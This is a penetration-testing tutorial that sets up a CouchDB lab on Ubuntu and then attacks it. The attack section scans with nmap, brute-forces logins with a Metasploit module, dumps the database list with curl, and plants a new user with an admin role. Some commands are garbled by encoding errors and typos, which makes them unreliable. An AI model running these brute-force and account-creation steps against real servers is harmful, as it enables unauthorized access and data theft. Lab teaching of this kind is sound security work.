<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Penetration Testing on CouchDB (5984)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/penetration-testing-on-couchdb-5984/" rel="bookmark"><time class="entry-date published" datetime="2020-08-31T18:43:16+00:00">August 31, 2020</time><time class="updated" datetime="2025-05-31T15:09:05+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3 class="ai-optimize-6"><span style="color: #800000;">What is CouchDB</span></h3>
<p class="ai-optimize-7 ai-optimize-introduction"><span style="color: #000000;">CouchDB is a Free and open-source fault-tolerant NoSQL database developed by Apache software foundation. It uses JSON, to store data, javascript as its query languages and It includes <strong>RESTFUL API </strong>to transmit data over <strong>HTTP. </strong></span></p>
<h3 class="ai-optimize-8"><span style="color: #800000;">CouchDB Features</span></h3>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">CouchDB have REST API that is based on HTTP which helps to communicate with database easily.</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">It stores the data in Semi-structured format that are flexible with individual implicit structures also you can store data in a flexible structure format.</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">Users of CouchDB have the option of powerful <strong>Data Mapping</strong>, which allows users to <strong>Querying</strong>, <strong>Combining</strong> and <strong>Filtering</strong> of the information.</span></li>
</ul>
<p class="ai-optimize-12"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dpyPr11LBsE/X00HdoD3TAI/AAAAAAAAn-o/TiOev2hgJig02fwgnyYWmG1jr3CKjFGEgCLcBGAsYHQ/s1600/0.png"/>Â  Â  Â  Â  Â  Â  Â Â </span></p>
<p class="ai-optimize-13"><span style="color: #000000;">In this post, we will demonstrate how to set-up our own Vulnerable CouchDB for penetration testing on Ubuntu 20.04.1 and how to conduct CouchDB penetration testing.</span></p>
<h3 class="ai-optimize-14"><span style="color: #800000;">Table of Contents</span></h3>
<ul>
<li class="ai-optimize-15"><span style="color: #000000;">Pre-requisites</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">CouchDB setup on Ubuntu 20.04.1</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">CouchDB penetration Testing</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Scanning: Nmap</span></li>
</ul>
<h3 class="ai-optimize-19"><span style="color: #800000;">Prerequisites</span></h3>
<p class="ai-optimize-20"><span style="color: #000000;">To configure CouchDB in your Ubuntu platform, there are some prerequisites required for installation.</span></p>
<ul>
<li class="ai-optimize-21"><span style="color: #000000;"><strong>Ubuntu 20.04.1 with minimum 4GB RAM and 2 CPU</strong></span></li>
<li class="ai-optimize-22"><span style="color: #000000;"><strong>Root Privileges</strong></span></li>
<li class="ai-optimize-23"><span style="color: #000000;"><strong>Apache server</strong></span></li>
<li class="ai-optimize-24"><span style="color: #000000;"><strong>Attacker Machine: Kali Linux</strong></span></li>
<li class="ai-optimize-25"><span style="color: #000000;"><strong>Enumeration</strong></span></li>
<li class="ai-optimize-26"><span style="color: #000000;"><strong>Exploiting: Metasploit </strong></span></li>
</ul>
<h3 class="ai-optimize-27"><span style="color: #800000;">CouchDB Setup on Ubuntu 20.04</span></h3>
<p class="ai-optimize-28"><span style="color: #000000;">Letâ€™s start with installing the apache server first</span></p>
<p class="ai-optimize-29"><span style="color: #000000;">Apache is an open-source HTTP based web server thatâ€™s available for Linux servers free of charge we can install it via terminal simply by running the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt-get install apache2</pre>
<p class="ai-optimize-30"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lWeM6VE6XoE/X00HjQmEWzI/AAAAAAAAn-s/QYCfK-UtNu84EIY9TKji0a8XRBL3_Dg3ACLcBGAsYHQ/s1600/1.png"/></span></p>
<p class="ai-optimize-31"><span style="color: #000000;">In order to install CouchDB first, we need to Enable CouchDB repository. Letâ€™s start it by adding GPG key into the system by entering the following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt-get install â€“y apt-transport-https gnupg ca-certificates</pre>
<p class="ai-optimize-32"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SYKSeclDu9A/X00HpLgbKDI/AAAAAAAAn-w/6AXoPHGcSz8w6X_GILEvmkgtTJSZPUtpACLcBGAsYHQ/s1600/2.png"/></span></p>
<p class="ai-optimize-33"><span style="color: #000000;">After adding the repository add the GPG key into the CouchDB repository by entering following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt-key adv â€“keyserver.ubuntu.com â€“recv-keys \ 8756C4F765C9AC3CB6B85D62379CE192D401AB61</pre>
<p class="ai-optimize-34"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K-vG1FOLpLU/X00HuFmbpvI/AAAAAAAAn-4/IU8s_YkqV5oa7bFfdx5sYIkB7tUZiEKgwCLcBGAsYHQ/s1600/3.png"/></span></p>
<p class="ai-optimize-35"><span style="color: #000000;">Now, the repository is enabled we can directly install CouchDB by entering following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">apt-get install couchdb</pre>
<p class="ai-optimize-36"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pb16LQT74e4/X00H0YJqYGI/AAAAAAAAn_A/iUid8bHp5sMek8wFvv8f_T4x-tL2NHlhgCLcBGAsYHQ/s1600/4.png"/></span></p>
<p class="ai-optimize-37"><span style="color: #000000;">Then a prompt will occur on the screen select the standalone option from it or as per your requirements</span></p>
<p class="ai-optimize-38"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mQedO611RTs/X00H5LHdvCI/AAAAAAAAn_E/BaRotx0341YodbuLGXN1R_U-VUIcjUN1wCLcBGAsYHQ/s1600/5.png"/></span></p>
<p class="ai-optimize-39"><span style="color: #000000;">Then Next, youâ€™ll be given an option to set the IP address of the network interface, enter IP of your system or server machine to bind it with CouchDB.</span></p>
<p class="ai-optimize-40"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-iAodz9S9nWo/X00H_AhqnBI/AAAAAAAAn_M/XehnYsuCl_Y6R8d5nDECY7SV6nWRJx5wwCLcBGAsYHQ/s1600/6.png"/></span></p>
<p class="ai-optimize-41"><span style="color: #000000;">On the next Prompt After entering the IP of a server machine, create a password for the admin user of CouchDB then next confirm your password and then installation will continue.</span></p>
<p class="ai-optimize-42"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d5QJu33RN7Q/X00INPtLXbI/AAAAAAAAn_c/beFZgxZJVAsDrAi3gZ50_879EkmU14_SACLcBGAsYHQ/s1600/7.png"/></span></p>
<p class="ai-optimize-43"><span style="color: #000000;">Now start and Enable CouchDB server in Ubuntu and check the server status by entering the following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">systemctl start couchdb
systemctl enable couchdb
systemctl status couchdb</pre>
<p class="ai-optimize-44"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kUd3IR-pHns/X00IS7GyreI/AAAAAAAAn_k/3EwNTZ1GDZQi6dCuOTeHpwt1wPLbGf29wCLcBGAsYHQ/s1600/8.png"/></span></p>
<p class="ai-optimize-45"><span style="color: #000000;">Congratulations! You have successfully installed CouchDB in your Ubuntu platform. </span><span style="color: #000000;">Now you can directly access CouchDB on your favourite Browser just ping following URL.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://your-server-ip:5984/_utils/</pre>
<p class="ai-optimize-46"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4DwYpUo_6Yw/X00IX9Vz_hI/AAAAAAAAn_o/m71xnRFKNqMM8hLBP-F7FMiYILeRktKZgCLcBGAsYHQ/s1600/9.png"/></span></p>
<p class="ai-optimize-47"><span style="color: #000000;">Use your credentials to login to the CouchDB database.</span></p>
<p class="ai-optimize-48"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-shyCSIkaz84/X00IfrBBYII/AAAAAAAAn_w/Si3kLZCjJNYLSlqbycaS-Fw_PTN_Sba1ACLcBGAsYHQ/s1600/10.png"/></span></p>
<p class="ai-optimize-49"><span style="color: #000000;">Now create a new admin for the server</span></p>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Yo1SaX3APac/X00InkvT83I/AAAAAAAAn_4/JgjBa2AW8GkkX_w-dW8Kw_n6sAomg32iQCLcBGAsYHQ/s1600/11.png"/></span></p>
<p class="ai-optimize-51"><span style="color: #000000;">After creating the admin now create a new database for the server</span></p>
<p class="ai-optimize-52"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_5pdUMXpO0k/X00IuKMGFnI/AAAAAAAAoAA/1Wsy2onJ_24PzHjgLit3pqqPQHIWLmasgCLcBGAsYHQ/s1600/12.png"/></span></p>
<p class="ai-optimize-53"><span style="color: #000000;">The database is created successfully</span></p>
<p class="ai-optimize-54"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-T70oPvQNg1Q/X00Iz6QGl_I/AAAAAAAAoAI/83vxuI3o3VsIPbZW2kuKiFcoDLpPTeo8QCLcBGAsYHQ/s1600/13.png"/></span></p>
<p class="ai-optimize-55"><span style="color: #000000;">Letâ€™s just some data into the database that we have created you can do it directly by the GUI interface but in my, Iâ€™m good with command line to do this follow the below commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl â€“u ignite:123 â€“X PUT http;//192.168.0.196:5984/raj</pre>
<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-lyd3RNhaTbQ/X00I4jbCVAI/AAAAAAAAoAQ/eM91zFCG7WAvESFinCGGYvhOGUUNHNxnQCLcBGAsYHQ/s1600/14.png"/></span></p>
<p class="ai-optimize-57"><span style="color: #000000;">Hurray! Weâ€™ve successfully created the database.</span></p>
<h3 class="ai-optimize-58"><span style="color: #800000;">Letâ€™s start Pentesting CouchDB</span></h3>
<p class="ai-optimize-59"><span style="color: #000000;">In this section, you will be learning how to compromise the Database using different techniques.</span></p>
<p class="ai-optimize-60"><span style="color: #000000;">Letâ€™s fire up Attacking machine Kali Linux</span></p>
<h3 class="ai-optimize-61"><span style="color: #800000;">Nmap</span></h3>
<p class="ai-optimize-62"><span style="color: #000000;">By default, CouchDB service is running on the port no.Â  5984 with the help of NMAP, letâ€™s identify the state of port.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p5984 192.168.0.196</pre>
<p class="ai-optimize-63"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-sUE3Hk98oZY/X00I_a_YIhI/AAAAAAAAoAU/piVhA4fzWIgJOA9_MY0RIIkxZTeAb13CwCLcBGAsYHQ/s1600/15.png"/></span></p>
<p class="ai-optimize-64"><span style="color: #000000;">As you can see, it has open state for CouchDB at port 5984</span></p>
<h3 class="ai-optimize-65"><span style="color: #800000;">Enumeration</span></h3>
<p class="ai-optimize-66"><span style="color: #000000;">NMAP have capability to perform Automatic Enumeration to perform this attack follow the below commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV â€“script couchdb-database, couchdb-stats -p 5984 192.168.0.196</pre>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gvtTXMDLHqA/X00JDyuexxI/AAAAAAAAoAY/cDx0a02TZF0lvEFeUiBXBZqy36RJCI3RwCLcBGAsYHQ/s1600/16.png"/></span></p>
<p class="ai-optimize-68"><span style="color: #000000;">As you can see, it provides quite enough information about the database that helps us to brute-forcing or in dumping the credentials.</span></p>
<h3 class="ai-optimize-69"><span style="color: #800000;">Exploiting: Metasploit</span></h3>
<p class="ai-optimize-70"><span style="color: #000000;"><strong>Module: couchdb_login</strong></span></p>
<p class="ai-optimize-71"><span style="color: #000000;">Letâ€™s brute force the target. To perform this attack, you should go with the following module by entering the following command by firing up the msf console</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/couchdb/couchdb_login
set rhosts 192.168.0.196
set user_file /root/user.txt
set pass_file /root/pass.txt
exploit</pre>
<p class="ai-optimize-72"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-v-b4Lvxbee4/X00JLxfM__I/AAAAAAAAoAg/AdCGebx0iBInI-4vOBArwI1DaO3UO7XKwCLcBGAsYHQ/s1600/17.png"/></span></p>
<p class="ai-optimize-73"><span style="color: #000000;">Great! now you have login credentials of the database.</span></p>
<p class="ai-optimize-74"><span style="color: #000000;">Now using that credentials, we can use curl command download whole databases created in the server</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl -u ignite:123 -X GET http://192.168.0.196:5984/_all_dbs</pre>
<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qVO0Wv2pLis/X00JTGdk4oI/AAAAAAAAoAo/gFSa3TGyIAww6b6FTfILHy4vfTRJrfMHACLcBGAsYHQ/s1600/18.png"/></span></p>
<p class="ai-optimize-76"><span style="color: #000000;">We also can create our user for the server using the curl command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">curl -u ignite:123 -X PUT -d '{"type":"user","name":"aarti","roles":["_admin"],"roles":[],"password":"123"}' 192.168.0.196:5984/_users/org.couchdb.user:aarti -H "Content-Type:application/json"</pre>
<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9RsfLcQ0DwY/X00JYjoho9I/AAAAAAAAoAw/PmTQbAAB83ck0pyOLeLoSfsBrEE_CPrwACLcBGAsYHQ/s1600/19.png"/></span></p>
<p class="ai-optimize-78"><span style="color: #000000;">Also, you can check for the user-created using curl command</span></p>
<p class="ai-optimize-79"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-mHID8sxIqZ8/X00JdAPiQVI/AAAAAAAAoA4/KZoL9oqMRRk1oOZUvf236QhKYAk_d4bxwCLcBGAsYHQ/s1600/20.png"/></span></p>
<p class="ai-optimize-80"><span style="color: #000000;">Now you have admin access of the whole database In manner to perform more attacks you can use exploits listed on MSF console.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;">In this way, we can test for CouchDB loopholes and submit the findings to the network admin ðŸ˜Š.</span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Penetration Testing. Follow this</span>Â <a href="https://www.hackingarticles.in/category/penetration-testing/">Link.</a></p>
<p class="ai-optimize-82"><span style="color: #000000;"><strong>Author</strong>Â â€“ Paras khorwal is a Certified Ethical Hacker, Technical writer and Penetration Tester at Hacking Articles. Technology and Gadget freak. ContactÂ <a style="color: #000000;" href="https://www.linkedin.com/in/paras-khorwal-904470197"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
